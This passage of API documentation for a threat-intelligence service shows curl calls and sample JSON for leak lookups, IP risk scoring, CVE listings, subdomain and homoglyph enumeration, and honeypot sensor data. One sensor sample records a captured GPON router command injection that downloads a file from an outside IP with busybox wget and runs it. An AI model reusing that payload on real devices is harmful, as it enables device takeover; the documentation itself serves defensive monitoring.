* leak: [String] Optional. If present, return information about a specific leak
    * Default: undefined, return information about all leaks

*Output*

```shell
curl 'https://api.binaryedge.io/v1/dataleaks/leaks?leak=ashleymadison' -H 'X-Token:API_TOKEN'
```

```json
{
  "ashleymadison": {
    "name": "ashleymadison",
    "fullname": "Ashley Madison",
    "description": "Ashley Madison is a canadian online dating service for married/ commited people.",
    "date": "2015-07-19",
    "year": 2015,
    "data": "Dates of birth, Email addresses, Ethnicities, Genders, Names, Passwords, Payment histories, Phone numbers, Physical addresses, Security questions and answers, Sexual orientations, Usernames, Website activity",
    "logo": "https://s3-eu-west-1.amazonaws.com/be-resources/dataleaks/ashleymadison.jpg",
    "features": [
      "Dates of birth",
      "Email addresses",
      "Ethnicities",
      "Genders",
      "Names",
      "Passwords",
      "Payment histories",
      "Phone numbers",
      "Physical addresses",
      "Security questions and answers",
      "Sexual orientations",
      "Usernames",
      "Website activity"
    ]
  }
}
```


### Risk Score

#### /v1/query/score/ip/{target}

IP Risk Score. Scoring is based on all information found on our databases regarding an IP and refers to the level of exposure of a target, i.e, the higher the score, the greater the risk of exposure. 

More details about scoring can be found on [https://github.com/binaryedge/ratemyip-openframework/blob/master/ip-score.md](https://github.com/binaryedge/ratemyip-openframework/blob/master/ip-score.md).

*Parameters*

* target: [String] Target IP address 

*Output*

```shell
curl 'https://api.binaryedge.io/v1/query/score/ip/xxx.xxx.xxx.xxx' -H 'X-Token:API_TOKEN'
```

```json
{
  "normalized_ip_score": 97.1,
  "normalized_ip_score_detailed": {
    "cve": 100,
    "attack_surface": 100,
    "encryption": 100,
    "rms": 100,
    "storage": 100,
    "web": 100,
    "torrents": 0
  },
  "ip_score_detailed": {
    "cve": 3,
    "attack_surface": 2,
    "encryption": 6,
    "rms": 10,
    "storage": 10,
    "web": 3,
    "torrents": 0
  },
  "results_detailed": {
    "ports": {
      "open": [
        4991,
        6666,
        22,
        443,
        3389,
        5901,
        23,
        80,
        1883,
        27017,
        6379,
        11211,
        9200,
        21,
        8080,
        25,
        3306
      ],
      "score": 17
    },
    "cve": {
      "result": [
        {
          "port": 4991,
          "cve": [
            {
              "cpe": "cpe:/a:igor_sysoev:nginx:1.2.6",
              "cve_list": [
                {
                  "cve": "CVE-2013-2070",
                  "cvss": 5.8
                },
                {
                  "cve": "CVE-2013-4547",
                  "cvss": 7.5
                },
                {
                  "cve": "CVE-2014-3616",
                  "cvss": 4.3
                },
                {
                  "cve": "CVE-2016-1247",
                  "cvss": 7.2
                },
                {
                  "cve": "CVE-2016-0742",
                  "cvss": 5
                },
                {
                  "cve": "CVE-2016-0746",
                  "cvss": 7.5
                },
                {
                  "cve": "CVE-2016-0747",
                  "cvss": 5
                },
                {
                  "cve": "CVE-2016-4450",
                  "cvss": 5
                }
              ],
              "score": 47.3
            }
          ],
          "score": 47.3
        },
        {
          "port": 6666,
          "cve": {
            "product": "Postgres-XC",
            "version": "1.1",
            "cve_list": [],
            "score": 0
          },
          "score": 0
        },
        {
          "port": 6666,
          "cve": [
            {
              "cpe": "cpe:/a:mysql:mysql:5.5.18.1",
              "cve_list": [
                {
                  "cve": "CVE-2005-1274",
                  "cvss": 10
                },
                {
                  "cve": "CVE-2005-0081",
                  "cvss": 5
                },
                {
                  "cve": "CVE-2005-0082",
                  "cvss": 5
                },
                {
                  "cve": "CVE-2005-0684",
                  "cvss": 10
                },
                {
                  "cve": "CVE-2012-2750",
                  "cvss": 10
                },
                {
                  "cve": "CVE-2012-4414",
                  "cvss": 6.5
                },
                {
                  "cve": "CVE-2011-2262",
                  "cvss": 5
                },
                {
                  "cve": "CVE-2012-0112",
                  "cvss": 3.5
                },
                {
                  "cve": "CVE-2012-0113",
                  "cvss": 5.5
                },
                {
                  "cve": "CVE-2012-0115",
                  "cvss": 4
                },
                {
                  "cve": "CVE-2012-0116",
                  "cvss": 4.9
                },
                {
                  "cve": "CVE-2012-0117",
                  "cvss": 3.5
                },
                {
                  "cve": "CVE-2012-0118",
                  "cvss": 4.9
                },
                {
                  "cve": "CVE-2012-0119",
                  "cvss": 4
                },
                {
                  "cve": "CVE-2012-0120",
                  "cvss": 4
                },
                {
                  "cve": "CVE-2012-0553",
                  "cvss": 7.5
                },
                {
                  "cve": "CVE-2012-2102",
                  "cvss": 3.5
                },
                {
                  "cve": "CVE-2012-2122",
                  "cvss": 5.1
                },
                {
                  "cve": "CVE-2012-2749",
                  "cvss": 4
                },
                {
                  "cve": "CVE-2013-1492",
                  "cvss": 7.5
                },
                {
                  "cve": "CVE-2015-3152",
                  "cvss": 4.3
                },
                {
                  "cve": "CVE-2016-0610",
                  "cvss": 3.5
                },
                {
                  "cve": "CVE-2016-0616",
                  "cvss": 4
                },
                {
                  "cve": "CVE-2013-5807",
                  "cvss": 4.9
                },
                {
                  "cve": "CVE-2016-6664",
                  "cvss": 6.9
                },
                {
                  "cve": "CVE-2004-0931",
                  "cvss": 5
                },
                {
                  "cve": "CVE-2017-3302",
                  "cvss": 5
                },
                {
                  "cve": "CVE-2016-7412",
                  "cvss": 6.8
                },
                {
                  "cve": "CVE-2012-5627",
                  "cvss": 4
                },
                {
                  "cve": "CVE-2014-0001",
                  "cvss": 7.5
                },
                {
                  "cve": "CVE-2016-6662",
                  "cvss": 10
                },
                {
                  "cve": "CVE-2009-4833",
                  "cvss": 5.8
                },
                {
                  "cve": "CVE-2012-0485",
                  "cvss": 4
                },
                {
                  "cve": "CVE-2012-0486",
                  "cvss": 5
                },
                {
                  "cve": "CVE-2012-0487",
                  "cvss": 4
                },
                {
                  "cve": "CVE-2012-0488",
                  "cvss": 4
                },
                {
                  "cve": "CVE-2012-0489",
                  "cvss": 4
                },
                {
                  "cve": "CVE-2012-0491",
                  "cvss": 4
                },
                {
                  "cve": "CVE-2012-0492",
                  "cvss": 2.1
                },
                {
                  "cve": "CVE-2012-0493",
                  "cvss": 2.1
                },
                {
                  "cve": "CVE-2012-0494",
                  "cvss": 1.7
                },
                {
                  "cve": "CVE-2012-0495",
                  "cvss": 4
                },
                {
                  "cve": "CVE-2012-0496",
                  "cvss": 4.3
                },
                {
                  "cve": "CVE-2012-5611",
                  "cvss": 6.5
                },
                {
                  "cve": "CVE-2012-5612",
                  "cvss": 6.5
                },
                {
                  "cve": "CVE-2016-6663",
                  "cvss": 4.4
                },
                {
                  "cve": "CVE-2005-1636",
                  "cvss": 4.6
                }
              ],
              "score": 242.3
            }
          ],
          "score": 242.3
        },
        {
          "port": 8080,
          "cve": [
            {
              "cpe": "cpe:/a:indy:httpd:13.2.3.2235",
              "cve_list": [],
              "score": 0
            }
          ],
          "score": 0
        },
        {
          "port": 25,
          "cve": {
            "cpe": [
              "cpe:/a:postfix:postfix"
            ],
            "cve_list": "no_version_provided",
            "score": 0
          },
          "score": 0
        },
        {
          "port": 3306,
          "cve": [
            {
              "cpe": "cpe:/a:mysql:mysql:5.5.47-mariadb",
              "cve_list": [
                {
                  "cve": "CVE-2005-1274",
                  "cvss": 10
                },
                {
                  "cve": "CVE-2005-0081",
                  "cvss": 5
                },
                {
                  "cve": "CVE-2005-0082",
                  "cvss": 5
                },
                {
                  "cve": "CVE-2005-0684",
                  "cvss": 10
                },
                {
                  "cve": "CVE-2011-2262",
                  "cvss": 5
                },
                {
                  "cve": "CVE-2012-0112",
                  "cvss": 3.5
                },
                {
                  "cve": "CVE-2012-0113",
                  "cvss": 5.5
                },
                {
                  "cve": "CVE-2012-0115",
                  "cvss": 4
                },
                {
                  "cve": "CVE-2012-0116",
                  "cvss": 4.9
                },
                {
                  "cve": "CVE-2012-0117",
                  "cvss": 3.5
                },
                {
                  "cve": "CVE-2012-0118",
                  "cvss": 4.9
                },
                {
                  "cve": "CVE-2012-0119",
                  "cvss": 4
                },
                {
                  "cve": "CVE-2012-0120",
                  "cvss": 4
                },
                {
                  "cve": "CVE-2015-3152",
                  "cvss": 4.3
                },
                {
                  "cve": "CVE-2016-0610",
                  "cvss": 3.5
                },
                {
                  "cve": "CVE-2016-6664",
                  "cvss": 6.9
                },
                {
                  "cve": "CVE-2004-0931",
                  "cvss": 5
                },
                {
                  "cve": "CVE-2017-3302",
                  "cvss": 5
                },
                {
                  "cve": "CVE-2016-7412",
                  "cvss": 6.8
                },
                {
                  "cve": "CVE-2016-6662",
                  "cvss": 10
                },
                {
                  "cve": "CVE-2009-4833",
                  "cvss": 5.8
                },
                {
                  "cve": "CVE-2012-0485",
                  "cvss": 4
                },
                {
                  "cve": "CVE-2012-0486",
                  "cvss": 5
                },
                {
                  "cve": "CVE-2012-0487",
                  "cvss": 4
                },
                {
                  "cve": "CVE-2012-0488",
                  "cvss": 4
                },
                {
                  "cve": "CVE-2012-0489",
                  "cvss": 4
                },
                {
                  "cve": "CVE-2012-0491",
                  "cvss": 4
                },
                {
                  "cve": "CVE-2012-0492",
                  "cvss": 2.1
                },
                {
                  "cve": "CVE-2012-0493",
                  "cvss": 2.1
                },
                {
                  "cve": "CVE-2012-0494",
                  "cvss": 1.7
                },
                {
                  "cve": "CVE-2012-0495",
                  "cvss": 4
                },
                {
                  "cve": "CVE-2012-0496",
                  "cvss": 4.3
                },
                {
                  "cve": "CVE-2016-6663",
                  "cvss": 4.4
                },
                {
                  "cve": "CVE-2005-1636",
                  "cvss": 4.6
                }
              ],
              "score": 164.8
            }
          ],
          "score": 164.8
        }
      ],
      "score": 454.40000000000003
    },
    "ssh": {
      "result": [
        {
          "port": 22,
          "algorithms": {
            "mac": [
              {
                "mac": "hmac-sha1-96",
                "score": 2
              },
              {
                "mac": "hmac-sha1",
                "score": 2
              },
              {
                "mac": "hmac-md5",
                "score": 2
              }
            ],
            "key_exchange": [
              {
                "kex": "diffie-hellman-group1-sha1",
                "score": 2
              }
            ],
            "encryption": [
              {
                "enc": "aes128-cbc",
                "score": 0
              },
              {
                "enc": "3des-cbc",
                "score": 2
              },
              {
                "enc": "aes256-cbc",
                "score": 0
              }
            ]
          },
          "keys": [
            {
              "fingerprint": "b7:d7:10:fd:b8:fb:91:2b:5e:a8:01:b2:03:e3:10:4f",
              "key_length": {
                "length": 1024,
                "score": 2
              },
              "debian_key": {
                "found": false,
                "score": 0
              }
            }
          ],
          "score": 12
        }
      ],
      "score": 12
    },
    "rms": {
      "result": [
        {
          "port": 3389,
          "rms": "rdp",
          "score": 8
        },
        {
          "port": 5901,
          "rms": "vnc",
          "score": 10
        },
        {
          "port": 23,
          "rms": "telnet",
          "score": 8
        }
      ],
      "score": 26
    },
    "ssl": {
      "result": [
        {
          "port": 443,
          "heartbleed": {
            "heartbleed": true,
            "score": 10
          },
          "ccs": {
            "ccs": true,
            "score": 6
          },
          "crime": {
            "crime": true,
            "score": 6
          },
          "renegotiation": {
            "renegotiation": true,
            "score": 6
          },
          "ocsp": {
            "ocsp": true,
            "score": 3
          },
          "no_certificates": {
            "no_certificates": false,
            "score": 0
          },
          "leaf_certificate": {
            "sha1_fingerprint": "c0e750b485ed9250f93f684bb1a87d37bec843b8",
            "issuer": "Huawei",
            "subject": "Huawei",
            "validity": {
              "date": "2016-07-14 09:48:15",
              "status": "expired",
              "score": 4
            },
            "signature": {
              "signature": "sha1WithRSAEncryption",
              "score": 5
            },
            "self_signed": {
              "self_signed": "single-certificate",
              "score": 5
            }
          },
          "other_certificates": [],
          "ciphers": [
            {
              "drown": true,
              "score": 6
            },
            {
              "poodle": true,
              "score": 6
            },
            {
              "logjam": false,
              "score": 0
            }
          ],
          "score": 52
        }
      ],
      "score": 52
    },
    "wec": {
      "result": [
        {
          "port": 25,
          "service": "smtp",
          "score": 6
        }
      ],
      "score": 6
    },
    "ftp": {
      "result": [
        {
          "port": 21,
          "service": "ftp",
          "score": 6
        }
      ],
      "score": 6
    },
    "http": {
      "result": [
        {
          "port": 4991,
          "service": "http",
          "score": 6
        },
        {
          "port": 8080,
          "service": "http",
          "score": 6
        }
      ],
      "score": 12
    },
    "storage": {
      "result": [
        {
          "port": 6666,
          "product": "postgres",
          "score": 4
        },
        {
          "port": 6666,
          "product": "mysql",
          "score": 4
        },
        {
          "port": 1883,
          "product": "mqtt",
          "connected": true,
          "score": 10
        },
        {
          "port": 27017,
          "product": "mongodb",
          "connected": true,
          "score": 10
        },
        {
          "port": 6379,
          "product": "redis",
          "connected": true,
          "score": 10
        },
        {
          "port": 11211,
          "product": "memcached",
          "connected": true,
          "score": 10
        },
        {
          "port": 9200,
          "product": "elasticsearch",
          "connected": true,
          "score": 10
        },
        {
          "port": 3306,
          "product": "mysql",
          "score": 4
        }
      ],
      "score": 62
    },
    "web": {
      "result": [
        {
          "port": 80,
          "headers": true,
          "score": 3
        }
      ],
      "score": 3
    },
    "torrents": {
      "result": [
        {
          "torrents": false,
          "score": 0
        }
      ],
      "score": 0
    }
  },
  "ip_address": "xxx.xxx.xxx.xxx"
}
```

#### /v1/query/cve/ip/{target}

Get list of CVEs that migh affect a specific IP.

*Parameters*

* target: [String] target IP address 

*Output*

```shell
curl 'https://api.binaryedge.io/v1/query/cve/ip/xxx.xxx.xxx.xxx' -H 'X-Token:API_TOKEN'
```

```json
{
  "query": "xxx.xxx.xxx.xxx",
  "events": {
    "ip": "xxx.xxx.xxx.xxx",
    "ports": [11, 15, 21, 25, 79, 80, 111, 119, 143, 3389, 6000, 8080],
    "results": [{
      "port": 111,
      "cpe": [],
      "ts": 1550723598503,
      "cves": []
    }, {
      "port": 11,
      "cpe": [],
      "ts": 1550713541527,
      "cves": []
    }, {
      "port": 6000,
      "cpe": [],
      "ts": 1549215405492,
      "cves": []
    }, {
      "port": 25,
      "cpe": [],
      "ts": 1551649814882,
      "cves": []
    }, {
      "port": 79,
      "cpe": [],
      "ts": 1550042997176,
      "cves": []
    }, {
      "port": 8080,
      "cpe": ["cpe:/a:apache:http_server:2.4.7"],
      "ts": 1551779143688,
      "cves": [{
        "cve": "CVE-2018-17199",
        "cvss": 5.0
      }, {
        "cve": "CVE-2018-1312",
        "cvss": 6.8
      }, {
        "cve": "CVE-2018-1283",
        "cvss": 3.5
      }, {
        "cve": "CVE-2017-9798",
        "cvss": 5.0
      }, {
        "cve": "CVE-2017-9788",
        "cvss": 6.4
      }, {
        "cve": "CVE-2017-7679",
        "cvss": 7.5
      }, {
        "cve": "CVE-2017-15715",
        "cvss": 6.8
      }, {
        "cve": "CVE-2017-15710",
        "cvss": 5.0
      }, {
        "cve": "CVE-2016-8743",
        "cvss": 5.0
      }, {
        "cve": "CVE-2016-8612",
        "cvss": 3.3
      }, {
        "cve": "CVE-2016-4975",
        "cvss": 4.3
      }, {
        "cve": "CVE-2016-2161",
        "cvss": 5.0
      }, {
        "cve": "CVE-2016-0736",
        "cvss": 5.0
      }, {
        "cve": "CVE-2015-3185",
        "cvss": 4.3
      }, {
        "cve": "CVE-2015-3184",
        "cvss": 5.0
      }, {
        "cve": "CVE-2014-8109",
        "cvss": 4.3
      }, {
        "cve": "CVE-2014-3523",
        "cvss": 5.0
      }, {
        "cve": "CVE-2014-0231",
        "cvss": 5.0
      }, {
        "cve": "CVE-2014-0226",
        "cvss": 6.8
      }, {
        "cve": "CVE-2014-0118",
        "cvss": 4.3
      }, {
        "cve": "CVE-2014-0117",
        "cvss": 4.3
      }, {
        "cve": "CVE-2014-0098",
        "cvss": 5.0
      }, {
        "cve": "CVE-2013-6438",
        "cvss": 5.0
      }]
    }, {
      "port": 3389,
      "cpe": [],
      "ts": 1551348878536,
      "cves": []
    }, {
      "port": 15,
      "cpe": [],
      "ts": 1549108048510,
      "cves": []
    }, {
      "port": 143,
      "cpe": [],
      "ts": 1549566728724,
      "cves": []
    }, {
      "port": 80,
      "cpe": ["cpe:/a:igor_sysoev:nginx:1.4.6"],
      "ts": 1550250446832,
      "cves": [{
        "cve": "CVE-2019-7401",
        "cvss": 7.5
      }, {
        "cve": "CVE-2016-4450",
        "cvss": 5.0
      }, {
        "cve": "CVE-2016-0747",
        "cvss": 5.0
      }, {
        "cve": "CVE-2016-0746",
        "cvss": 7.5
      }, {
        "cve": "CVE-2016-0742",
        "cvss": 5.0
      }, {
        "cve": "CVE-2014-3616",
        "cvss": 4.3
      }, {
        "cve": "CVE-2014-0133",
        "cvss": 5.1
      }]
    }, {
      "port": 21,
      "cpe": [],
      "ts": 1550642140211,
      "cves": []
    }, {
      "port": 119,
      "cpe": [],
      "ts": 1550377835750,
      "cves": []
    }]
  }
}
```


### Domains

What is exposed via DNS? What subdomains belong to a Domain? What domains are served by IP X?

#### /v1/query/domains/subdomain/{target}

Return list of subdomains known from the target domains

*Parameters*

* target: [String] Domain you want to get list of known subdomains.
* page: [Int] Optional. Results page number.
    * Default: _page=1_
* pagesize: [Int] Optional. Results page size.
    * Default: _pagesize=100_

*Output*

```shell
curl 'https://api.binaryedge.io/v1/query/domains/subdomain/example.com' -H 'X-Token:API_TOKEN'
```

```json
{
  "query": "root:example.com",
  "page": 1,
  "pagesize": 100,
  "total": 6308,
  "events": ["m.example.com", "startup.antichat.example.com", "anandop1.example.com", "vladimirbezz3.example.com"]
}
```

#### /v1/query/domains/dns/{target}

Return list of known DNS results for the target domain.

Possible types of records currently available:

* A
* AAAA
* NS
* MX

*Parameters*

* target: [String] Domain you want to get DNS related data.
* page: [Int] Optional. Results page number.
    * Default: _page=1_
* pagesize: [Int] Optional. Results page size.
    * Default: _pagesize=100_

*Output*

```shell
curl 'https://api.binaryedge.io/v1/query/domains/dns/example.com' -H 'X-Token:API_TOKEN'
```

```json
{
  "query": "root:example.com",
  "page": 1,
  "pagesize": 100,
  "total": 6308,
  "events": [{
    "A": ["92.63.97.42"],
    "updated_at": "2018-09-22T04:53:21.082802",
    "domain": "startup.antichat.example.com",
    "root": "example.com"
  }, {
    "A": ["93.184.216.34"],
    "MX": ["example.com"],
    "NS": ["ns1.example.com", "ns2.example.com"],
    "updated_at": "2018-12-10T13:20:16.854174",
    "domain": "example.com",
    "root": "example.com",
  }, {
    "A": ["91.235.136.112"],
    "updated_at": "2018-09-22T04:14:29.031596",
    "domain": "vladimirbezz3.example.com",
    "root": "example.com"
  }, {
    "A": ["93.179.68.6"],
    "updated_at": "2018-09-22T03:51:36.852124",
    "domain": "i.seeva.example.com",
    "root": "example.com"
  }]
}
```

#### /v1/query/domains/ip/{target}

Return records that have the specified IP address in their A or AAAA records.

*Parameters*

* target: [String] Target IP address or CIDR up to /24, supports IPV4 or IPV6
* page: [Int] Optional. Results page number.
    * Default: _page=1_
* pagesize: [Int] Optional. Results page size.
    * Default: _pagesize=100_

*Output*

```shell
curl 'https://api.binaryedge.io/v1/query/domains/ip/8.8.8.8' -H 'X-Token:API_TOKEN'
```

```json
{
  "query": "A:\"8.8.8.8\"",
  "page": 1,
  "pagesize": 100,
  "total": 726,
  "events": [{
    "A": ["8.8.8.8"],
    "updated_at": "2018-06-08T20:51:30.676063",
    "NS": ["ns1058.ui-dns.org", "ns1062.ui-dns.com", "ns1068.ui-dns.biz", "ns1096.ui-dns.de"],
    "domain": "aeroway.co.uk",
    "root": "aeroway.co.uk",
    "MX": ["mx00.1and1.co.uk", "mx01.1and1.co.uk"]
  }, {
    "A": ["8.8.8.8"],
    "updated_at": "2018-06-08T20:53:30.348620",
    "NS": ["f1g1ns1.dnspod.net", "f1g1ns2.dnspod.net"],
    "domain": "84168800.com",
    "root": "84168800.com"
  }, {
    "A": ["8.8.8.8"],
    "updated_at": "2018-06-08T20:53:32.450310",
    "NS": ["f1g1ns1.dnspod.net", "f1g1ns2.dnspod.net"],
    "domain": "84169911.com",
    "root": "84169911.com"
  }, {
    "A": ["8.8.8.8"],
    "updated_at": "2018-06-08T20:53:32.508761",
    "NS": ["f1g1ns1.dnspod.net", "f1g1ns2.dnspod.net"],
    "domain": "84163311.com",
    "root": "84163311.com"
  }, {
    "A": ["8.8.8.8"],
    "updated_at": "2018-06-08T20:53:32.540496",
    "NS": ["f1g1ns1.dnspod.net", "f1g1ns2.dnspod.net"],
    "domain": "00888416.com",
    "root": "00888416.com"
  }]
}
```

#### /v1/query/domains/search

List of Domains/DNS data based on a Query.  Can be used with specific parameters and/or full-text search. Possible types of records currently available:

* A
* AAAA
* NS
* MX
* CNAME
* TXT

*Parameters*

* query: [String] String used to query our data. If no filters are used, it will perform a full-text search on the entire events.
* page: [Int] Optional. Results page number.
    * Default: _page=1_
* pagesize: [Int] Optional. Results page size.
    * Default: _pagesize=100_

*Output*

```shell
curl 'https://api.binaryedge.io/v1/query/domains/search?query=A:127.0.0.1' -H 'X-Token:API_TOKEN'
```

```json
{
  "query": "A:127.0.0.1",
  "page": 1,
  "pagesize": 100,
  "total": 176685,
  "events": [{
    "A": ["127.0.0.1"],
    "updated_at": "2018-06-08T20:32:57.002881",
    "NS": ["ns3jkl.name.com", "ns4qxz.name.com", "ns2knz.name.com", "ns1ksz.name.com"],
    "domain": "heathynurseway.co.uk",
    "root": "heathynurseway.co.uk",
    "MX": ["mail.emailgoodbye.me"]
  }, {
    "A": ["127.0.0.1"],
    "updated_at": "2018-06-08T20:29:19.612334",
    "NS": ["ns1.antagus.de", "ns2.antagus.de"],
    "domain": "vit.press",
    "root": "vit.press",
    "MX": ["mail.vit.press"]
  }]
}
```

#### /v1/query/domains/enumeration

This endpoint attempts to enumerate subdomains from a larger dataset. The validate flag can be used to have all subdomains resolved on the fly and only those with DNS entries behind them returned.

*Parameters*

* domain: [string] Domain you want to enumerate
* validate: [any] Optional. If _validate=1_, forces all subdomains to be resolved on request and only live subdomains to be returned
    * Default: _validate=0_
* total: [int] Optional. Return at most the number of results specified
    * Default: undefined, return all results

*Output*

```shell
curl 'https://api.binaryedge.io/v1/query/domains/enumeration/binaryedge.io?validate=1' -H 'X-Token:API_TOKEN'
```

```json
{
  "query": "binaryedge.io",
  "total": 54,
  "events": [
    {
      "fqdn": "torrents.services.core.binaryedge.io",
      "records": [
        {
          "type": "A",
          "answers": [
            "167.114.242.196"
          ]
        }
      ]
    },
    {
      "fqdn": "cve.services.dev.binaryedge.io",
      "records": [
        {
          "type": "A",
          "answers": [
            "167.114.228.35"
          ]
        }
      ]
    },
    {
      "fqdn": "beira.services.dev.binaryedge.io",
      "records": [
        {
          "type": "A",
          "answers": [
            "167.114.228.35"
          ]
        }
      ]
    }
  ]
}
```

#### /v1/query/domains/homoglyphs

This endpoint generates a list of homoglyphs for a base domain. The validate flag can be used to have all homoglyphs resolved on the fly and only those with DNS entries behind them returned.

*Parameters*

* domain: [string] Domain you want to generate homoglyphs
* validate: [any] Optional. If _validate=1_, forces all homoglyphs to be resolved on request and only live homoglyphs to be returned
    * Default: _validate=0_
* total: [int] Optional. Return at most the number of results specified
    * Default: undefined, return all results

*Output*

```shell
curl 'https://api.binaryedge.io/v1/query/domains/homoglyphs/binaryedge.io?validate=1' -H 'X-Token:API_TOKEN'
```

```json
{
  "query": "binaryedge.io",
  "total": 3,
  "events": [
    {
      "homoglyph": "binaryedge.io",
      "records": [
        {
          "type": "A",
          "answers": [
            "104.28.7.147",
            "104.28.6.147"
          ]
        },
        {
          "type": "AAAA",
          "answers": [
            "2606:4700:30::681c:793",
            "2606:4700:30::681c:693"
          ]
        },
        {
          "type": "MX",
          "answers": [
            "aspmx3.googlemail.com",
            "aspmx2.googlemail.com",
            "alt2.aspmx.l.google.com",
            "aspmx.l.google.com",
            "alt1.aspmx.l.google.com"
          ]
        },
        {
          "type": "NS",
          "answers": [
            "ines.ns.cloudflare.com",
            "amir.ns.cloudflare.com"
          ]
        },
        {
          "type": "TXT",
          "answers": [
            "v=spf1 include:_spf.google.com include:sendgrid.net include:email.chargebee.com include:servers.mcsv.net ~all",
            "google-site-verification=bhof7a1nmd90snoyjmz3bozznwpvsga6z9nn0fngyys"
          ]
        }
      ]
    },
    {
      "homoglyph": "binaryed.ge.io",
      "records": [
        {
          "type": "A",
          "answers": [
            "193.223.78.230"
          ]
        }
      ]
    },
    {
      "homoglyph": "binarye.dge.io",
      "records": [
        {
          "type": "MX",
          "answers": [
            "in2-smtp.messagingengine.com",
            "in1-smtp.messagingengine.com"
          ]
        }
      ]
    }
  ]
}
```


### Sensors

#### /v1/query/sensors/ip/{target}

Details about an Scanner. List of recent events form the specified host, including details of scanned ports, payloads and tags.

*Parameters*

* target: [String] Target IP address or CIDR up to /24

*Output*

```shell
curl 'https://api.binaryedge.io/v1/query/sensors/ip/xxx.xxx.xxx.xxx' -H 'X-Token:API_TOKEN'
```

```json
{
  "query": "xxx.xxx.xxx.xxx",
  "total": 1,
  "targets_found": 1,
  "events": [{
    "port": 443,
    "results": [{
      "target": {
        "port": 443,
        "protocol": "tcp"
      },
      "origin": {
        "ts": 1549500839739,
        "type": "sinkhole",
        "ip": "xxx.xxx.xxx.xxx",
        "rdns": "xxx.xxx.xxx.example.com"
      },
      "data": {
        "payload": "POST /GponForm/diag_Form?style/ HTTP/1.1\\r\\nUser-Agent: Hello, World\\r\\nAccept: */*\\r\\nAccept-Encoding: gzip, deflate\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\n\\r\\nXWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://185.244.25.98/bin+-O+/tmp/gaf;sh+/tmp/gaf`&ipv=0",
        "extra": {
          "http": {
            "method": "POST",
            "path": "/GponForm/diag_Form?style/",
            "version": "1.1",
            "headers": {
              "user-agent": "Hello, World",
              "accept": "*/*",
              "accept-encoding": "gzip, deflate",
              "content-type": "application/x-www-form-urlencoded"
            }
          }
        },
        "tags": ["HTTP_SCANNER"]
      },
    }]
  }]
}
```

#### /v1/query/sensors/search

Events based on a Query. List of recent events for the given query, including details of scanned ports, payloads and tags. Can be used with specific parameters and/or full-text search.

*Parameters*

* query: [String] String used to query our data. If no filters are used, it will perform a full-text search on the entire events. See [Search Parameters](sensors-search.md) for details on what parameters can be used.
* days: [Integer] Optional. Number of days to get the reuslts for. For example, days=1 for the last day of data.
    * Default: _days=30_
* only_ips: [Int] Optional. If _only\_ips=1_, only output IP addresses, ports and protocols. 
    * Default: _only\_ips=0_
* page: [Int] Optional. Results page number.
    * Default: _page=1_
* pagesize: [Int] Optional. Results page size.
    * Default: _pagesize=100_

*Output*

```shell
curl 'https://api.binaryedge.io/v1/query/sensors/search?query=tags:ssh_scanner' -H 'X-Token:API_TOKEN'
```

```json
{
  "query": "tags:ssh_scanner",
  "page": 1,
  "pagesize": 20,
  "total": 1117979,
  "events": [{
    "data": {
      "payload": "SSH-2.0-PUTTY\\r\\n",
      "extra": {
        "ssh": {
          "description": "SSH-2.0-PUTTY"
        }
      },
      "tags": ["SSH_SCANNER"]
    },
    "target": {
      "port": 22,
      "protocol": "tcp"
    },
    "origin": {
      "ip": "218.92.1.153",
      "type": "sinkhole",
      "ts": 1549625590653,
      "asn": 4134
    }
  }, {
    "target": {
      "port": 22,
      "protocol": "tcp"
    },
    "data": {
      "payload": "\\x00\\x00\\x02\\x84\\x07\\x14t\\x85\\x97.Sf\\x88\\xa3\\x1a\\x7f\\xf7:ZzG\\\\\\x00\\x00\\x00Ydiffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1\\x00\\x00\\x00\\x0fssh-rsa,ssh-dss\\x00\\x00\\x00\\x92aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour128,arcfour,cast128-cbc,3des-cbc\\x00\\x00\\x00\\x92aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour128,arcfour,cast128-cbc,3des-cbc\\x00\\x00\\x00Uhmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com\\x00\\x00\\x00Uhmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com\\x00\\x00\\x00\\x04none\\x00\\x00\\x00\\x04none\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00=@\\x8d71\\xc9&",
      "extra": {
        "ssh": {
          "hassh": "92674389fa1e47a27ddd8d9b63ecd42b",
          "hassh_algorithms": "diffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1;aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour128,arcfour,cast128-cbc,3des-cbc;hmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com;none"
        }
      },
      "tags": ["SSH_SCANNER"]
    },
    "origin": {
      "ip": "58.242.83.31",
      "type": "sinkhole",
      "ts": 1549625585310,
      "asn": 4837
    }
  }]
}
```

#### /v1/query/sensors/search/stream

Events based on a Query. Stream of recent events for the given query, including details of scanned ports, payloads and tags. Can be used with specific parameters and/or full-text search.

*Parameters*

* query: [String] String used to query our data. If no filters are used, it will perform a full-text search on the entire events. See [Search Parameters](sensors-search.md) for details on what parameters can be used.
* days: [Integer] Optional. Number of days to get the results for. For example, days=1 for the last day of data.
    * Default: _days=30_
* only_ips: [Int] Optional. If _only\_ips=1_, only output IP addresses, ports and protocols. 
    * Default: _only\_ips=0_

*Output*

```shell
curl 'https://api.binaryedge.io/v1/query/sensors/search/stream?query=tags:ssh_scanner' -H 'X-Token:API_TOKEN'
```

```json
{
  "data": {
    "payload": "SSH-2.0-PUTTY\\r\\n",
    "extra": {
      "ssh": {
        "description": "SSH-2.0-PUTTY"
      }
    },
    "tags": ["SSH_SCANNER"]
  },
  "target": {
    "port": 22,
    "protocol": "tcp"
  },
  "origin": {
    "ip": "218.92.1.153",
    "type": "sinkhole",
    "ts": 1549625590653,
